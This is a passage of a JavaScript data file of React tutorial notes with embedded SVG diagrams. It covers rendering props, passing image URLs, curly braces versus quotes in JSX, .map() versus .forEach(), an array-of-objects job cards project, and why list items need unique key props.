                    <text x="110" y="24" text-anchor="middle" class="svg-title">&lt;Card /&gt; Instance 1</text>
                    <rect x="15" y="36" width="190" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="54" text-anchor="middle" class="svg-mono-xs">user: "Sarthak"</text>
                    <text x="110" y="70" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">age: 18</text>
                  </g>

                  <!-- Child 2 -->
                  <g transform="translate(330, 130)">
                    <rect x="0" y="0" width="220" height="90" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
                    <text x="110" y="24" text-anchor="middle" class="svg-title">&lt;Card /&gt; Instance 2</text>
                    <rect x="15" y="36" width="190" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="54" text-anchor="middle" class="svg-mono-xs">user: "Aman"</text>
                    <text x="110" y="70" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">age: 21</text>
                  </g>

                  <!-- Child 3 -->
                  <g transform="translate(630, 130)">
                    <rect x="0" y="0" width="220" height="90" rx="8" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.5"/>
                    <text x="110" y="24" text-anchor="middle" class="svg-title">&lt;Card /&gt; Instance 3</text>
                    <rect x="15" y="36" width="190" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="54" text-anchor="middle" class="svg-mono-xs">user: "Aditya"</text>
                    <text x="110" y="70" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">age: 24</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 13: RECEIVING, USING & RENDERING DYNAMIC DATA WITH PROPS
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-13-receiving-rendering-props",
      number: "13",
      shortLabel: "Receiving & Rendering Props",
      title: "Receiving, Using & Rendering Dynamic Data With Props",
      summary: "Accessing props via dot notation ({props.user}, {props.age}), passing dynamic image URLs, and the crucial JSX gotcha of curly braces {} vs string quotes.",
      subtopicLabels: ["13.1 Displaying Props in Card", "13.2 Passing Dynamic Images", "13.3 Curly Braces vs Quotes Gotcha"],
      diagramCount: 2,
      sections: [
        {
          num: "13.1",
          title: "Receiving & Displaying Props Inside Card.jsx",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Accepting <code>props</code> in the Child Component:</strong>
                <ul class="notes-sub-list">
                  <li>In <code>Card.jsx</code>, declare <strong><code>props</code></strong> as the parameter of your functional component:
                    <pre class="notes-code-block"><code>// src/components/Card.jsx
const Card = (props) => {
  return (
    &lt;div className="card"&gt;
      &lt;h2&gt;{props.user}&lt;/h2&gt;
      &lt;p&gt;Age: {props.age}&lt;/p&gt;
    &lt;/div&gt;
  );
};

export default Card;</code></pre>
                  </li>
                  <li>Because <code>props</code> is a standard JavaScript object (e.g. <code>{ user: "Sarthak", age: 18 }</code>), you read each property using <strong>dot notation</strong> inside JSX curly braces:
                    <ul class="notes-sub-list">
                      <li><code>{props.user}</code> → Dynamically renders the person's name (<em>Sarthak</em>, <em>Aman</em>, <em>Aditya</em>).</li>
                      <li><code>{props.age}</code> → Dynamically renders their age (<em>18</em>, <em>21</em>, <em>24</em>).</li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "13.2",
          title: "Passing Dynamic Images Through Props",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Passing Image URLs Dynamically:</strong>
                <ul class="notes-sub-list">
                  <li>Just like text strings and numbers, image URLs (such as image addresses copied from Unsplash or a CDN) can be passed as props from <code>App.jsx</code>:
                    <pre class="notes-code-block"><code>// In App.jsx
&lt;Card user="Aditya" age={24} img="https://images.unsplash.com/photo-1534528741775-53994a69daeb" /&gt;</code></pre>
                  </li>
                  <li>Inside <code>Card.jsx</code>, bind the prop to the <code>src</code> attribute using curly braces:
                    <pre class="notes-code-block"><code>// In Card.jsx
const Card = (props) => {
  return (
    &lt;div className="card"&gt;
      &lt;img src={props.img} alt={props.user} /&gt;
      &lt;h2&gt;{props.user}&lt;/h2&gt;
      &lt;p&gt;Age: {props.age}&lt;/p&gt;
    &lt;/div&gt;
  );
};</code></pre>
                  </li>
                  <li>Now every single <code>&lt;Card /&gt;</code> shares the exact same CSS border, shadow, and layout structure, while automatically displaying its own unique photo, name, and age!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 13.1 · Props Object Extraction & JSX DOM Data Binding Pipeline</span>
                <span class="diagram-frame-tag">OBJECT EXTRACTION & DOM INJECTION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing props object arriving and binding to h2, p, and img DOM elements via dot notation">
                  <!-- Props Object -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="240" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">PROPS OBJECT</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title">Received Parameter</text>
                    <rect x="15" y="66" width="210" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs">props = {</text>
                    <text x="40" y="108" class="svg-mono-xs" style="fill:var(--primary);">user: "Aditya",</text>
                    <text x="40" y="126" class="svg-mono-xs" style="fill:var(--accent);">age: 24,</text>
                    <text x="40" y="144" class="svg-mono-xs" style="fill:var(--success);">img: "https://..."</text>
                    <text x="25" y="156" class="svg-mono-xs">}</text>
                  </g>

                  <!-- Extraction Arrows -->
                  <g transform="translate(280, 50)">
                    <line x1="0" y1="20" x2="60" y2="0" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="60,-4 68,0 60,4" fill="var(--primary)"/>
                    <line x1="0" y1="65" x2="60" y2="65" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="60,61 68,65 60,69" fill="var(--accent)"/>
                    <line x1="0" y1="110" x2="60" y2="130" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="60,126 68,130 60,134" fill="var(--success)"/>
                  </g>

                  <!-- JSX Binding Nodes -->
                  <g transform="translate(355, 25)">
                    <rect x="0" y="0" width="220" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker">JSX TEMPLATE</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">Dot Notation Binding</text>

                    <rect x="15" y="66" width="190" height="28" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="105" y="84" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">&lt;h2&gt;{props.user}&lt;/h2&gt;</text>

                    <rect x="15" y="102" width="190" height="28" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="105" y="120" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">&lt;p&gt;Age: {props.age}&lt;/p&gt;</text>

                    <rect x="15" y="138" width="190" height="28" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="105" y="156" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;img src={props.img} /&gt;</text>
                  </g>

                  <!-- Render Arrow -->
                  <g transform="translate(585, 105)">
                    <line x1="0" y1="10" x2="40" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="40,6 48,10 40,14" fill="var(--success)"/>
                    <text x="20" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Renders</text>
                  </g>

                  <!-- Live Rendered Output -->
                  <g transform="translate(640, 25)">
                    <rect x="0" y="0" width="210" height="175" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="105" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">RENDERED HTML</text>
                    <text x="105" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Live DOM Node</text>

                    <rect x="15" y="66" width="180" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">Aditya</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--text-muted);">Age: 24</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--success); font-size:10px;">[Photo Rendered ✓]</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "13.3",
          title: "Common JSX Gotcha: Curly Braces {} vs. Quotes \"\"",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Golden Rule of JSX:</strong>
                <ul class="notes-sub-list">
                  <li>Whenever you want to evaluate a <strong>JavaScript expression, variable, or prop</strong> inside JSX, you <strong>must wrap it in curly braces <code>{}</code></strong>.</li>
                </ul>
              </li>
              <li><strong>What Happens If You Forget <code>{}</code> or Use Quotes?</strong>
                <ul class="notes-sub-list">
                  <li><strong>Gotcha 1 (Text):</strong> Writing <code>&lt;h1&gt;props.user&lt;/h1&gt;</code> does not evaluate the variable—it literally prints the characters <code>props.user</code> onto the screen instead of displaying <code>"Sarthak"</code>.</li>
                  <li><strong>Gotcha 2 (Images):</strong> Writing <code>&lt;img src="props.img" /&gt;</code> instructs the browser to request an image file named literally <code>props.img</code>, resulting in a <strong>404 Not Found broken image icon</strong>! Always write <strong><code>&lt;img src={props.img} /&gt;</code></strong> without quotes.</li>
                </ul>
              </li>
              <li><strong>Architecture Note (Towards Dynamic Lists):</strong>
                <ul class="notes-sub-list">
                  <li>Manually copy-pasting ten <code>&lt;Card /&gt;</code> components with hardcoded prop values in <code>App.jsx</code> is fine for initial practice, but in real production applications data comes from APIs as an <strong>Array of Objects</strong> and is dynamically mapped into components using <code>.map()</code>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 13.2 · JSX Evaluation Gotcha: String Literal vs. JavaScript Expression</span>
                <span class="diagram-frame-tag">JSX SYNTAX GUARDRAIL</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Diagram contrasting incorrect string quotes causing broken image with correct curly braces evaluating prop URL">
                  <!-- Bad: Quotes -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="170" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="108" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="69" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">INCORRECT ❌</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Quotation Marks: Literal String</text>

                    <rect x="15" y="70" width="365" height="78" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">&lt;img src="props.img" /&gt;</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--text-muted);">Browser fetches GET /props.img</text>
                    <text x="25" y="132" class="svg-mono-xs" style="fill:var(--danger);">Result: 404 Not Found (Broken Image)</text>
                  </g>

                  <!-- Good: Curly Braces -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="170" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="100" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="65" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT ✓</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Curly Braces: JS Expression</text>

                    <rect x="15" y="70" width="365" height="78" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;img src={props.img} /&gt;</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--text-muted);">Evaluates prop variable to image URL</text>
                    <text x="25" y="132" class="svg-mono-xs" style="fill:var(--success);">Result: Photo renders successfully ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 14: RENDERING DYNAMIC LISTS WITH .MAP() & ARRAY OF OBJECTS
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-14-rendering-lists-map-objects",
      number: "14",
      shortLabel: "Lists & Array of Objects",
      title: "Rendering Dynamic Lists With .map() & Array of Objects",
      summary: "Why manual indexing fails, .map() inside JSX curly braces, forEach vs map, transforming items, array of objects, and fixing 'Objects are not valid as a React child'.",
      subtopicLabels: ["14.1 Manual Indexing vs .map()", "14.2 forEach vs map", "14.3 Array of Objects & Job Cards", "14.4 Objects Not Valid Error"],
      diagramCount: 2,
      sections: [
        {
          num: "14.1",
          title: "Why Manual Indexing Fails & Using .map() in JSX",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Failure of Manual Array Indexing:</strong>
                <ul class="notes-sub-list">
                  <li>When you have an array of data, manually accessing elements one-by-one (e.g. <code>arr[0]</code>, <code>arr[1]</code>, <code>arr[2]</code>) is tedious, repetitive, and fails the moment array items are added or deleted dynamically.</li>
                </ul>
              </li>
              <li><strong>The Solution — <code>.map()</code> Inside JSX Curly Braces:</strong>
                <ul class="notes-sub-list">
                  <li>In JSX, JavaScript expressions must always be wrapped in curly braces: <code>{arr.map((elem) =&gt; ...)}</code>.</li>
                  <li><strong>Gotcha:</strong> If you write <code>arr.map(...)</code> without curly braces, React treats it as plain text and literally outputs <code>arr.map(...)</code> on the web page instead of executing JavaScript!</li>
                </ul>
              </li>
              <li><strong>How <code>.map()</code> Renders Elements Step-by-Step:</strong>
                <ul class="notes-sub-list">
                  <li><code>.map()</code> iterates over every item in the array and returns a new transformed value or JSX element for each one.</li>
                  <li><strong>Example:</strong> If <code>arr = [10, 20, 30, 40]</code> (4 elements), whatever JSX you return inside <code>.map()</code> renders <strong>exactly 4 times</strong>. If the array contains 10 items, it renders 10 times automatically.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "14.2",
          title: "forEach vs. map & Transforming Elements",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Why Use <code>.map()</code> Instead of <code>.forEach()</code> in JSX?</strong>
                <ul class="notes-sub-list">
                  <li><strong><code>.forEach()</code>:</strong> Iterates through an array for side effects, but its return value is always <strong><code>undefined</code></strong>. If you place <code>arr.forEach(...)</code> inside JSX, React receives <code>undefined</code> and renders absolutely nothing on the screen!</li>
                  <li><strong><code>.map()</code>:</strong> Returns a <strong>brand new array</strong> of JSX elements. React automatically unwraps arrays of JSX elements and renders them into the DOM.</li>
                </ul>
              </li>
              <li><strong>Accessing & Transforming Each Item (<code>elem</code>):</strong>
                <ul class="notes-sub-list">
                  <li>The callback parameter <code>elem</code> holds the current item on each iteration.</li>
                  <li>You can transform values dynamically:
                    <ul class="notes-sub-list">
                      <li><code>elem * 2</code> on <code>[10, 99, 30]</code> outputs <code>20</code>, <code>198</code>, <code>60</code>.</li>
                      <li>Wrapping in JSX: <code>arr.map((elem) =&gt; &lt;h1&gt;{elem}&lt;/h1&gt;)</code> renders each number inside a separate heading.</li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 14.1 · Array Iteration in React: .forEach() vs. .map()</span>
                <span class="diagram-frame-tag">FUNCTIONAL TRANSFORMATION PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting forEach returning undefined with map returning an array of JSX elements">
                  <!-- forEach: Undefined -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="137" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="83.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">arr.forEach() ❌</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Returns undefined</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="94" class="svg-mono-xs">{arr.forEach(item =&gt; &lt;h1&gt;{item}&lt;/h1&gt;)}</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--danger);">Return Value: undefined</text>
                    <text x="25" y="136" class="svg-mono-xs" style="fill:var(--text-muted);">Result: Blank screen (zero items rendered)</text>
                  </g>

                  <!-- map: Returns Array -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="108" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="69" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">arr.map() ✓</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Returns New JSX Array</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs">{arr.map(item =&gt; &lt;h1&gt;{item}&lt;/h1&gt;)}</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Return Value: [&lt;h1&gt;10&lt;/h1&gt;, &lt;h1&gt;20&lt;/h1&gt;]</text>
                    <text x="25" y="136" class="svg-mono-xs" style="fill:var(--text-muted);">Result: Renders each item in DOM ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "14.3",
          title: "Working With an Array of Objects (Job Openings Cards Project)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Real-World Structured Data:</strong>
                <ul class="notes-sub-list">
                  <li>Production applications rarely work with flat numbers like <code>[10, 20, 30]</code>. Data arrives from databases or APIs as an <strong>Array of Objects</strong>:
                    <pre class="notes-code-block"><code>const users = [
  { user: 'Sarthak', age: 18 },
  { user: 'Harsh', age: 22 },
  { user: 'Aman', age: 21 }
];</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>The Job Openings Cards Project (<code>04-cards-project</code>):</strong>
                <ul class="notes-sub-list">
                  <li>To build a real-world career portal interface, create an array of <strong>10 job opening objects</strong> for top tech enterprises: <strong>Meta, Amazon, Apple, Netflix, Google, Microsoft, IBM, Tesla, Nvidia, and Oracle</strong>.</li>
                  <li>Each object encapsulates rich structured properties:
                    <pre class="notes-code-block"><code>const jobOpenings = [
  {
    companyName: "Google",
    logo: "https://...google-logo.svg",
    datePosted: "2 days ago",
    post: "Senior Frontend Engineer",
    tag1: "Full Time",
    tag2: "React / TS",
    pay: "$185,000 / yr",
    location: "Mountain View, CA"
  },
  // ... 9 more company opening objects
];</code></pre>
                  </li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "14.4",
          title: "Common Error: 'Objects are not valid as a React child'",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Mistake:</strong>
                <ul class="notes-sub-list">
                  <li>If you map over an array of objects and write <code>{jobOpenings.map(elem =&gt; &lt;h1&gt;{elem}&lt;/h1&gt;)}</code>, React crashes immediately!</li>
                  <li><strong>The Error Message:</strong> <code>Uncaught Error: Objects are not valid as a React child (found: object with keys {companyName, logo, ...}). If you meant to render a collection of children, use an array instead.</code></li>
                  <li><strong>Why?</strong> React can only render primitive values (strings, numbers, JSX elements) directly into text nodes. It cannot guess how to render an entire JavaScript object dictionary.</li>
                </ul>
              </li>
              <li><strong>The Two Fixes:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Fix 1 (Direct Property Access):</strong> Render primitive fields individually: <code>&lt;h1&gt;{elem.companyName}&lt;/h1&gt;</code>.</li>
                  <li><strong>Fix 2 (Component Props Pattern):</strong> Return a reusable component (like <code>&lt;Card ... /&gt;</code>) and forward each object property as a prop: <code>&lt;Card company={elem.companyName} pay={elem.pay} /&gt;</code>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 14.2 · Array of Objects Transformation to UI Cards (Job Openings Pipeline)</span>
                <span class="diagram-frame-tag">DATA-DRIVEN RENDERING PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 240" class="arch-svg" role="img" aria-label="Diagram showing array of 10 tech company job objects being mapped into reusable Card components">
                  <!-- Raw Data Box -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="230" height="195" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">RAW DATA SOURCE</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title">jobOpenings Array</text>
                    <rect x="15" y="66" width="200" height="115" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs" style="fill:var(--primary);">[</text>
                    <text x="35" y="106" class="svg-mono-xs">{ company: "Meta", ... },</text>
                    <text x="35" y="124" class="svg-mono-xs">{ company: "Google", ... },</text>
                    <text x="35" y="142" class="svg-mono-xs">{ company: "Apple", ... },</text>
                    <text x="35" y="160" class="svg-mono-xs" style="fill:var(--text-muted);">// 7 more objects</text>
                    <text x="25" y="174" class="svg-mono-xs" style="fill:var(--primary);">]</text>
                  </g>

                  <!-- Map Transformation Arrow -->
                  <g transform="translate(265, 105)">
                    <line x1="0" y1="10" x2="60" y2="10" stroke="var(--primary)" stroke-width="2.5"/>
                    <polygon points="60,5 70,10 60,15" fill="var(--primary)"/>
                    <rect x="5" y="-12" width="55" height="18" rx="3" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="32" y="1" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">.map()</text>
                  </g>

                  <!-- Mapping Logic -->
                  <g transform="translate(345, 20)">
                    <rect x="0" y="0" width="240" height="195" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">TRANSFORMATION</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title">App.jsx Mapped Loop</text>
                    <rect x="15" y="66" width="210" height="115" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="90" class="svg-mono-xs">jobOpenings.map(elem =&gt;</text>
                    <text x="35" y="112" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">&lt;Card</text>
                    <text x="45" y="130" class="svg-mono-xs">company={elem.companyName}</text>
                    <text x="45" y="148" class="svg-mono-xs">pay={elem.pay}</text>
                    <text x="35" y="166" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">/&gt;</text>
                    <text x="25" y="176" class="svg-mono-xs">)</text>
                  </g>

                  <!-- Mount Arrow -->
                  <g transform="translate(595, 105)">
                    <line x1="0" y1="10" x2="50" y2="10" stroke="var(--success)" stroke-width="2.5"/>
                    <polygon points="50,5 60,10 50,15" fill="var(--success)"/>
                    <text x="25" y="-2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Renders</text>
                  </g>

                  <!-- Rendered Cards Grid -->
                  <g transform="translate(665, 20)">
                    <rect x="0" y="0" width="190" height="195" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="95" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">OUTPUT DOM</text>
                    <text x="95" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">10 Dynamic Cards</text>

                    <rect x="15" y="66" width="160" height="34" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="95" y="87" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">Meta · $180k</text>

                    <rect x="15" y="106" width="160" height="34" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="95" y="127" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">Google · $185k</text>

                    <rect x="15" y="146" width="160" height="34" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="95" y="167" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">+ 8 More Tech Cards</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 15: PASSING OBJECT PROPS & SOLVING THE MISSING KEY WARNING
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-15-object-props-key-warning",
      number: "15",
      shortLabel: "Object Props & Key Warning",
      title: "Passing Object Props & Solving the Missing 'key' Prop Warning",
      summary: "Project setup for 04-cards-project, passing multi-attribute props, the College Roll Number analogy for unique keys, fixing warnings with idx, and practice ideas.",
      subtopicLabels: ["15.1 Cards Setup", "15.2 Why React Needs key", "15.3 Fixing With idx"],
      diagramCount: 2,
      sections: [
        {
          num: "15.1",
          title: "Project Setup & Rendering Reusable &lt;Card /&gt; Components",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Clean Project Architecture (<code>04-cards-project</code>):</strong>
                <ul class="notes-sub-list">
                  <li>Reset <code>App.jsx</code> and <code>index.css</code> to remove starter boilerplate.</li>
                  <li>Create a <code>components/</code> folder inside <code>src/</code> and add <code>Card.jsx</code>.</li>
                  <li>In <code>index.css</code>, style the outer container (e.g. <code>.parent { min-height: 100vh; width: 100%; background-color: #111; padding: 2rem; display: flex; flex-wrap: wrap; gap: 1.5rem; }</code>).</li>
                </ul>
              </li>
              <li><strong>Mapping Objects to Component Props:</strong>
                <ul class="notes-sub-list">
                  <li>Render <code>&lt;Card /&gt;</code> inside <code>.map()</code> over the 10-item <code>jobOpenings</code> array:
                    <pre class="notes-code-block"><code>// src/App.jsx
import Card from './components/Card';

function App() {
  return (
    &lt;div className="parent"&gt;
      {jobOpenings.map((elem, idx) =&gt; (
        &lt;Card
          key={idx}
          companyName={elem.companyName}
          logo={elem.logo}
          datePosted={elem.datePosted}
          post={elem.post}
          tag1={elem.tag1}
          tag2={elem.tag2}
          pay={elem.pay}
          location={elem.location}
        /&gt;
      ))}
    &lt;/div&gt;
  );
}</code></pre>
                  </li>
                  <li><strong>Notice on Image URLs:</strong> Placeholder image links (like Clearbit CDN logos) can occasionally break. Always verify URLs in a browser tab and replace any broken links with working assets.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "15.2",
          title: "Why React Needs a Unique 'key' Prop (College Roll Number Analogy)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Dreaded Console Warning:</strong>
                <ul class="notes-sub-list">
                  <li>When you render lists using <code>.map()</code> without a key, React prints: <code>Warning: Each child in a list should have a unique "key" prop. See https://react.dev/link/warning-keys for more information.</code></li>
                </ul>
              </li>
              <li><strong>Why React Demands a Unique Key:</strong>
                <ul class="notes-sub-list">
                  <li>When an array updates (e.g. a new item is inserted at the beginning, an item is deleted, or the list is sorted), React compares the old Virtual DOM tree with the new Virtual DOM tree.</li>
                  <li>Without unique identifiers, React cannot determine which item moved, which item was added, or which item was removed—forcing it to discard and destructively rebuild the entire list of DOM nodes.</li>
                </ul>
              </li>
              <li><strong>The College Roll Number Analogy:</strong>
                <ul class="notes-sub-list">
                  <li>Imagine a classroom of 100 students wearing identical school uniforms. To a substitute teacher, every student looks indistinguishable.</li>
                  <li>If the college assigns each student a permanent, unique <strong>Roll Number / Student ID Card</strong>, the teacher can instantly identify and update the record of one specific student without inspecting all 100 students!</li>
                  <li>In the exact same way, the <strong><code>key</code> prop</strong> acts as an internal ID badge that tells React's reconciliation engine exactly which DOM node corresponds to which data item.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 15.1 · The College Roll Number Analogy: Why the React Reconciler Demands Unique Keys</span>
                <span class="diagram-frame-tag">DIFFING ALGORITHM & IDENTITY RECONCILIATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing college roll number analogy where keys uniquely identify list items during updates">
                  <!-- Without Keys -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">WITHOUT KEYS ❌</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">No Roll Numbers / Anonymous Items</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">Students have no ID cards</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--text-muted);">Teacher cannot identify individuals</text>
                    <text x="25" y="136" class="svg-mono-xs" style="fill:var(--danger);">React tears down & recreates DOM list</text>
